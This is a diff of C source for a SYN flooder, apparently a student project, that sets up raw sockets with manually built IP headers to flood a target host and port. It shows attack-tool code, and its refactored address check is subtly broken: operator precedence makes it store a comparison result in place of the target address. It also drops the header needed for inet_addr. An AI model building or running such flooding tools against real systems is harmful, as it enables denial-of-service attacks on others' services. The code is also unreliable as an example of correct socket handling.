@@ -5,18 +5,17 @@
 ** Login   <janel@epitech.net>
 **
 ** Started on  Mon May 29 12:19:55 2017 Janel
-** Last update Tue Jul 25 16:20:52 2017 Janel
+** Last update Tue Sep 19 14:30:02 2017 
 */
 
 #include <stdio.h>
 #include <time.h>
 #include <unistd.h>
 #include <stdlib.h>
-#include <arpa/inet.h>
-#include <sys/socket.h>
 #include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <sys/socket.h>
 #include "syn_flooder.h"
-#include "layer3.h"
 #include "debug.h"
 
 void		__attribute__((constructor))ctor(void)
@@ -24,7 +23,7 @@ void		__attribute__((constructor))ctor(void)
   srand(time(NULL));
 }
 
-static void	usage(const char * const prog_name)
+static __inline__ void	usage(const char * const prog_name)
 {
   fprintf(stderr, "[-] USAGE: %s <hostname> <port>\n", prog_name);
 }
@@ -36,7 +35,7 @@ static void	usage(const char * const prog_name)
 ** On some OS's, IPPROTO_RAW will not set IP_HDRINCL
 ** automatically.
 */
-__inline__ static char	set_header_ip_inclusion(const int sd)
+static __inline__ char	set_header_ip_inclusion(const int sd)
 {
   return ((setsockopt(sd, IPPROTO_IP, IP_HDRINCL,
 		      &(int){1}, sizeof(int)))
@@ -59,8 +58,9 @@ static int	create_socket(struct sockaddr_in *destination_address,
     return (PRINT_ERROR("Socket creation:"), -1);
   destination_address->sin_family = AF_INET;
   destination_address->sin_port = htons(port);
-  destination_address->sin_addr.s_addr = inet_addr(target_ip);	/* WARNING test AGAINST -1*/
-  return (sd);
+  return ((destination_address->sin_addr.s_addr =
+	   inet_addr(target_ip) == INADDR_NONE)
+	  ? (-1) : (sd));
 }
 
 int			main(int argc, char *argv[])
